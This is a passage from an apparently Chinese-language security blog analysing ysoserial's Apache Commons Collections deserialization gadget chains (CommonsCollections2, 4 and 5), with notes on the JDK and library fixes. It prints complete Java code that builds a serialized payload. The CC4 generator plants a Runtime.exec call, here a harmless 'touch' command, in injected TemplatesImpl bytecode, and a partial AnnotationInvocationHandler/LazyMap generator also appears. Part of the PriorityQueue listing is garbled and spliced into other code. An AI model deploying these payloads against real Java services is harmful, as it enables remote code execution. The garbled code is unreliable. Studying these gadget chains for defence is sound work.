不是我们设置的 LazyMap, 这自然导致了在外层 AnnotationInvocationHandler 调用 proxy 时, 内层的
AnnotationInvocationHandler 的 memberValues 是 被重新设置的 LinkedHashMap, 而不是我们构造的
LazyMap, 自然就无法利用了.
看看 java 对 AnnotationInvocationHandler 的修复
ysoseiral 这个 exp 在 2015 年初被发布  
查看 git 的 history, 可以看到在 2015 年 12 月被修复  
java8u71 2016 年初发布  
再看 commons-collections3 的修复:
在 readObject, writeObject 时都做了检测, 需要设置对应的 Property 为 true 才能反序列化
InvokerTransformer.
看这个漏洞的历史, 也是非常有趣的.
## CommonsCollections2
还是先看调用栈
    Gadget chain:
        ObjectInputStream.readObject()
            PriorityQueue.readObject()
                ...
                    TransformingComparator.compare()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()
这个 gadget 比较特殊的是用了
`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 这个内置类, 这个类的骚操作就是,
在调用他的 `newTransformer` 或者 `getOutputProperties` (这个方法内部会调用 `newTransformer`)
时, 会动态从字节码中重建一个类. 这就使得如果我们能操作字节码, 就能在创建类时执任意 java 代码.
    public synchronized Transformer newTransformer() throws TransformerConfigurationException {
        TransformerImpl transformer = new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory);
        if (this._uriResolver != null) {
            transformer.setURIResolver(this._uriResolver);
        }
        if (this._tfactory.getFeature("http://javax.xml.XMLConstants/feature/secure-processing")) {
            transformer.setSecureProcessing(true);
        }
        return transformer;
    }
    private Translet getTransletInstance() throws TransformerConfigurationException {
            try {
                if (this._name == null) {
                    return null;
                } else {
                    if (this._class == null) {
                        this.defineTransletClasses(); // 这个方法里面调用了 ClassLoader 加载 bytecode
                    }
    //... 省略
同时在这个 gadget 中, 没有使用之前的 LazyMap, 而是使用的是 PriorityQueue + TransformingComparator
这套组合拳.  
不过这个 exp 只对 CommonsCollections4 有效, 在 3 中 TransformingComparator 没有 implements
Serializable, 导致无法序列化.
java.util.PriorityQueue
    private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();
        s.readInt();
        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Object[].class, this.size);
        Object[] es = this.queue = new Object[Math.max(this.size, 1)];
        int i = 0;
        for(int n = this.size; i ();
            Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);
            constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);
            Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), new Class[]{Map.class}, invo);
            constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
            constructor.setAccessible(true);
            Object obj = constructor.newInstance(Deprecated.class, proxy);
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
            oos.writeObject(obj);
            oos.close();
        }
    }
## CommonsCollections4
这个与上面的 CommonsCollections2 接近, 区别是将 InvokerTransformer 替换为
InstantiateTransformer, 换汤不换药 + 1, 不再多做解释
    package demo.rmb122;
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import org.apache.commons.collections4.Transformer;
    import org.apache.commons.collections4.functors.ConstantTransformer;
    import org.apache.commons.collections4.functors.InstantiateTransformer;
    import org.apache.commons.collections4.comparators.TransformingComparator;
    import org.apache.commons.collections4.functors.ChainedTransformer;
    import javax.xml.transform.Templates;
    import java.io.FileOutputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.PriorityQueue;
    public class CommonsCollections4 {
        public static class Placeholder {
        }
        public static void main(String[] args) throws Exception {
            String AbstractTranslet = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
            String TemplatesImpl = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String TrAXFilter = "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter";
            ClassPool classPool = ClassPool.getDefault();
            classPool.insertClassPath(new ClassClassPath(Placeholder.class));
            classPool.insertClassPath(new ClassClassPath(Class.forName(AbstractTranslet)));
            CtClass placeholder = classPool.get(Placeholder.class.getName());
            placeholder.setSuperclass(classPool.get(Class.forName(AbstractTranslet).getName()));
            placeholder.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\"touch /dev/shm/rmb122_test1\");");
            placeholder.setName("demo.rmb122." + System.currentTimeMillis());
            byte[] bytecode = placeholder.toBytecode();
            Object templates = Class.forName(TemplatesImpl).getConstructor(new Class[]{}).newInstance();
            Field fieldByteCodes = templates.getClass().getDeclaredField("_bytecodes");
            fieldByteCodes.setAccessible(true);
            fieldByteCodes.set(templates, new byte[][]{bytecode});
            Field fieldName = templates.getClass().getDeclaredField("_name");
            fieldName.setAccessible(true);
            fieldName.set(templates, "rmb122");
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(Class.forName(TrAXFilter)),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}),
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            TransformingComparator comparator = new TransformingComparator(chainedTransformer);
            PriorityQueue queue = new PriorityQueue(2);
            queue.add(1);
            queue.add(1);
            Field field = PriorityQueue.class.getDeclaredField("queue");
            field.setAccessible(true);
            Object[] innerArr = (Object[]) field.get(queue);
            innerArr[0] = templates;
            innerArr[1] = templates;
            field = PriorityQueue.class.getDeclaredField("comparator");
            field.setAccessible(true);
            field.set(queue, comparator);
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
            oos.writeObject(queue);
            oos.close();
        }
    }
## CommonsCollections5
这个不是换汤不换药了, 用了一个新的利用链去触发 InvokerTransformer, 不过 ysoserial 上注释里面的调用链是错误的,
估计是忘记改了. 正确的如下:
    Gadget chain:
        ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()